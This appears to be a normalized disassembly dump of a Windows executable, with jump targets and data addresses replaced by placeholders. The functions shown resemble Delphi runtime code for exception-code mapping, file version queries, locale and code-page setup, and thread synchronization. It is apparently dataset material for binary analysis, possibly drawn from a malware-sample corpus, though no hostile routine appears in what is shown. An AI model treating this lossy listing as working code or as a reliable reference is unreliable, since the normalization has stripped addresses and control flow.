call sub_405d38
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40babf
lea eax [ ebp - 0x20 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40bb0c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bba4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bd5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404278
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408550
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd66
lea eax [ ebp - 0x170 ]
call sub_404008
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_40402c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40bd70
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40be2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bb0c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b790
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push ebp
call sub_40bba4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be32
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
mov ebx eax
sub_40be4c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40be3c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bb8c
mov eax [ rw-data ]
mov [ eax ] sub_40bd70
mov eax sub_40bad8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40baf4
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bed0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403290
xor eax eax
mov [ rw-data ] eax
sub_40bf50
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404278
sub_40bfe0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c0b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040a0
lea eax [ ebp - 0x8 ]
call j_sub_4044d4#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c0bd
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax ebx
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c099
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c0cc
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c144
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4044c8
mov edx esi
dec edx
call sub_40c0cc
sub_40c180
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4042c8
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c1a8
pop esi
pop ebx
retn
mov eax ebx
call sub_4042c8
mov esi eax
sub_40c1a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4042c8
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c3b8
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c200
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4042c8
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c3b8
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c3b8
dec eax
mov ebx eax
sub_40c290
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042c8
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c200
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4042c8
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c2f4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042c8
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4042c8
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c200
mov eax esi
call sub_4042c8
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4042c8
mov [ esp ] eax
jmp r-xdata
sub_40c37c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4044c8
add eax esi
dec eax
call sub_40c354
sub_40c3b8
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4044c8
add eax ebx
dec eax
call sub_40c354
add eax ebx
sub_40c3f4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4044c8
push eax
mov eax esi
call sub_4044c8
mov ebp eax
mov eax ebp
pop edx
call sub_40c42c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c42c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408638
mov [ esp ] eax
mov eax ebp
call sub_408638
mov edi eax
mov edx ebp
mov eax esi
call sub_4087d0
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c168
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4087d0
mov ebx eax
inc ebx
sub_40c4cc
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c4f4
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c4f4
test eax eax
jne r-xdata
sub_40c4f4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4087bc
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c168
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4087bc
mov edi eax
test edi edi
jne r-xdata
sub_40c534
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c598
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404278
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4081a8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c59f
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_40c5a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c534
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c620
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c608
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c5a8
pop ecx
push ebp
call sub_40c5a8
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402dc8
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c794
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40ca5f
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c620
call sub_40b084
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40afd4
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40405c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40afd4
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4081a8
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40afd4
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4081a8
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b020
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b020
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40afd4
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4081a8
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b020
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40afd4
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b30c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_40405c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40afd4
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b30c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_40405c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b020
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40afd4
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_40405c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40afd4
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_40405c
lea eax [ ebp - 0x8 ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_404008
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40afd4
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4081a8
test eax eax
jne r-xdata
call sub_40b25c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404388
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404388
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b020
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ca66
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_40402c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40afd4
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4081a8
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40afd4
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4081a8
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4040a0
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4040a0
jmp r-xdata
sub_40cb14
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cba4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40af88
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cbab
lea eax [ ebp - 0x14 ]
call sub_404008
retn
sub_40cbfc
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4085c4
mov [ rw-data ] eax
sub_40cc80
push ebx
push esi
push edi
push ebp
call sub_403644
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026ec
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403280
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40362c
sub_40cce8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40ccd0
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cd70
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407cc4
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cc70
mov [ ebp ] eax
sub_40cd70
push ebx
mov ebx eax
mov eax ebx
call sub_40ccd0
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cc70
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cdb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_40ce24
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_40ceb0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_40ceb0
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ce6c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40cce8
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cc78
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cc58
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cc78
test eax eax
je r-xdata
mov eax edi
call sub_40ce6c
test bl bl
je r-xdata
mov eax edi
call sub_40cea0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cc58
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cc64
sub_40cf4c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cce8
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cc78
mov eax ebx
call sub_40ce84
mov eax ebx
call sub_40ce78
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cd60
sub_40cf9c
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40cce8
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40ce90
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cc64
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cc58
